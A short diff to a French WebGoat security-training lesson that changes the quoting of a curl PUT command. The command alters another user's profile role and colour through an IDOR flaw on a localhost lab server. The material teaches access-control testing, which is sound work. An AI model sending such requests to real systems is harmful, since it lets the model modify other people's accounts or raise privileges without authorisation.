@@ -258,7 +258,7 @@ Modifier la requête pour exécuter un PUT et modifier les valeurs des attribute
 
 [source,sh]
 ----
-curl -X PUT -d '{"role" : 1,   "color" : "red", "userId" : 2342388}'  -H "Content-Type: application/json" "http://localhost:8080/WebGoat/IDOR/profile/2342388" ... 
+curl -X PUT -d "{"""role""" : 1,   """color""" : """red""", """userId""" : 2342388}"  -H "Content-Type: application/json" "http://localhost:8080/WebGoat/IDOR/profile/2342388" ...
 ----
 
 
